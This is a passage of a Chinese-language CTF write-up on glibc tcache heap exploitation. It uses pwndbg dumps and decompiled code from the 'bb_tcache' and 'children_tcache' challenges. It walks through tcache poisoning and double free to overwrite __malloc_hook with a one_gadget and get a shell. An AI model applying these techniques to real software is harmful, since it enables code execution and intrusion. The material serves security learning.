       30   fprintf(stderr, "We got the control\n");
    ────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
    00:0000│ rdx rsp  0x7ffe99bc1bb0 —▸ 0x55a4635689a0 (__libc_csu_init) ◂— push   r15
    01:0008│          0x7ffe99bc1bb8 —▸ 0x55a464be8260 —▸ 0x7ffe99bc1bb0 —▸ 0x55a4635689a0 (__libc_csu_init) ◂— push   r15
    02:0010│          0x7ffe99bc1bc0 —▸ 0x7ffe99bc1cb0 ◂— 0x1
    03:0018│          0x7ffe99bc1bc8 ◂— 0xad94ca33a5db2a00
    04:0020│ rbp      0x7ffe99bc1bd0 —▸ 0x55a4635689a0 (__libc_csu_init) ◂— push   r15
    05:0028│          0x7ffe99bc1bd8 —▸ 0x7f6dd0a631c1 (__libc_start_main+241) ◂— mov    edi, eax
    06:0030│          0x7ffe99bc1be0 ◂— 0x40000
    07:0038│          0x7ffe99bc1be8 —▸ 0x7ffe99bc1cb8 —▸ 0x7ffe99bc2912 ◂— 0x74632f656d6f682f ('/home/ct')
    pwndbg> heapinfo
    (0x20)     fastbin[0]: 0x0
    (0x30)     fastbin[1]: 0x0
    (0x40)     fastbin[2]: 0x0
    (0x50)     fastbin[3]: 0x0
    (0x60)     fastbin[4]: 0x0
    (0x70)     fastbin[5]: 0x0
    (0x80)     fastbin[6]: 0x0
    (0x90)     fastbin[7]: 0x0
    (0xa0)     fastbin[8]: 0x0
    (0xb0)     fastbin[9]: 0x0
                      top: 0x55a464be82e0 (size : 0x20d20) 
           last_remainder: 0x0 (size : 0x0) 
                unsortbin: 0x0
    (0x90)   tcache_entry[7]: 0x55a464be8260 --> 0x7ffe99bc1bb0 --> 0x55a4635689a0
我们可以看见设置的栈地址放在了tcache_entry的第二个堆，这时我们只要new两个0x80大小的chunk就可以控制tcache_next所在的空间
我们拿个例题来看看，这是山东省科来杯的一道简单pwn题，由于他给的libc就叫libc-2.27所以我们直接用ubuntu18.04的环境去调试，首先我们先看下题目的基本信息
    ➜  bbtcache file bb_tcache 
    bb_tcache: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=642e76244eb176cccd3e281014f18a7ea7551682, stripped
    ➜  bbtcache checksec bb_tcache 
    [*] '/home/Ep3ius/pwn/process/bbtcache/bb_tcache'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
我们接着反编译分析一下题目
    void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
    {
      unsigned int i; // [rsp+Ch] [rbp-14h]
      int choice; // [rsp+10h] [rbp-10h]
      void *chunk; // [rsp+18h] [rbp-8h]
      setvbuf(stdout, 0LL, 2, 0LL);
      setvbuf(stdin, 0LL, 2, 0LL);
      setvbuf(stderr, 0LL, 2, 0LL);
      i = 0;
      puts("Welcome to easy heap game!");
      printf("I think you might need this: 0x%016llx\n", &system);
      while ( i != 7 )
      {
        menu(++i);
        choice = fgets_input();
        if ( choice == 2 )                          // free
        {
          free(chunk);
        }
        else if ( choice == 3 )                     // write
        {
          puts("You might need this to tamper something.");
          read(0, chunk, 8uLL);
        }
        else
        {
          if ( choice != 1 )                        // new
            exit(0);
          chunk = malloc(0x10uLL);
        }
      }
      puts("Game over!");
      exit(0);
    }
程序逻辑十分清晰，一共七次机会进行new、free、write的操作来getshell，由于除了次数没有任何限制，所以我们能很直接的体会到tcache机制所带来的安全方面问题，我们先做个标准的tcache_poisoning起手式，先放一个堆块到tcache_entry
    pwndbg> heapinfo
    (0x20)     fastbin[0]: 0x0
    (0x30)     fastbin[1]: 0x0
    (0x40)     fastbin[2]: 0x0
    (0x50)     fastbin[3]: 0x0
    (0x60)     fastbin[4]: 0x0
    (0x70)     fastbin[5]: 0x0
    (0x80)     fastbin[6]: 0x0
    (0x90)     fastbin[7]: 0x0
    (0xa0)     fastbin[8]: 0x0
    (0xb0)     fastbin[9]: 0x0
                      top: 0x556b70596270 (size : 0x20d90) 
           last_remainder: 0x0 (size : 0x0) 
                unsortbin: 0x0
    (0x20)   tcache_entry[0]: 0x556b70596260
接着我们通过write操作去修改一下tcache_next为&malloc_hook
    pwndbg> heapinfo
    (0x20)     fastbin[0]: 0x0
    (0x30)     fastbin[1]: 0x0
    (0x40)     fastbin[2]: 0x0
    (0x50)     fastbin[3]: 0x0
    (0x60)     fastbin[4]: 0x0
    (0x70)     fastbin[5]: 0x0
    (0x80)     fastbin[6]: 0x0
    (0x90)     fastbin[7]: 0x0
    (0xa0)     fastbin[8]: 0x0
    (0xb0)     fastbin[9]: 0x0
                      top: 0x556b70596270 (size : 0x20d90) 
           last_remainder: 0x0 (size : 0x0) 
                unsortbin: 0x0
    (0x20)   tcache_entry[0]: 0x556b70596260 --> 0x7f2d9da10c10 (&__malloc_hook)
接着new两次把tcache从取出并把malloc_hook修改成one_gadget后new一个新chunk触发malloc_hook就可以getshell了，很简单又直接的题目吧。
我们回到children_tcache，先做个tcache_dup，也就是对我们之前插在两个unsort_bin中间的chunk进行两次free
    pwndbg> parseheap
    addr                prev                size                 status              fd                bk 
    0x564f27df9000      0x0                 0x250                Used                None              None
    0x564f27df9250      0x0                 0x510                Used                None              None
    0x564f27df9760      0x510               0x30                 Used                None              None
    0x564f27df9790      0xdadadadadadadada  0x4f0                Freed     0x7fa26b599c78    0x7fa26b599c78
    0x564f27df9c80      0x4f0               0x20                 Used                None              None
    pwndbg> heapinfo
    (0x20)     fastbin[0]: 0x0
    (0x30)     fastbin[1]: 0x0
    (0x40)     fastbin[2]: 0x0
    (0x50)     fastbin[3]: 0x0
    (0x60)     fastbin[4]: 0x0
    (0x70)     fastbin[5]: 0x0
    (0x80)     fastbin[6]: 0x0
    (0x90)     fastbin[7]: 0x0
    (0xa0)     fastbin[8]: 0x0
    (0xb0)     fastbin[9]: 0x0
                      top: 0x556e12172ca0 (size : 0x20360) 
           last_remainder: 0x556e12172790 (size : 0x4f0) 
                unsortbin: 0x556e12172790 (size : 0x4f0)
    (0x30)   tcache_entry[1]: 0x556e12172770
    pwndbg>
接着我们只要free(2)就相当于获得了两个指向0x556e12172770的指针
    pwndbg> heapinfo
    (0x20)     fastbin[0]: 0x0
    (0x30)     fastbin[1]: 0x0
    (0x40)     fastbin[2]: 0x0
    (0x50)     fastbin[3]: 0x0
    (0x60)     fastbin[4]: 0x0
    (0x70)     fastbin[5]: 0x0
    (0x80)     fastbin[6]: 0x0
    (0x90)     fastbin[7]: 0x0
    (0xa0)     fastbin[8]: 0x0
    (0xb0)     fastbin[9]: 0x0
                      top: 0x556e12172ca0 (size : 0x20360) 
           last_remainder: 0x556e12172790 (size : 0x4f0) 
                unsortbin: 0x556e12172790 (size : 0x4f0)
    (0x30)   tcache_entry[1]: 0x556e12172770 --> 0x556e12172770 (overlap chunk with 0x556e12172760(freed) )
接着我们就可以new一个新tcache里面存放malloc_hook然后通过tcache_poisoning就可以把malloc_hook修改为one_gadget，再new一个新chunk就可以getshell了。
在不断的挖掘tcache机制就会遇到更多更有意思的东西，虽然降低安全性但也变得更加有趣了(滑稽)
感谢M4x师傅，kirin师傅，Hpasserby师傅的知识分享
相关链接
调试环境 : [nepire-pwn](https://github.com/Nepire/nepire-pwn) (将~/nepire-pwn/DOCKER/Dockerfile第一行的16.04 换成17.10或更高即可调试tcache)
调试器：[PWNDBG](https://github.com/Nepire/Pwngdb)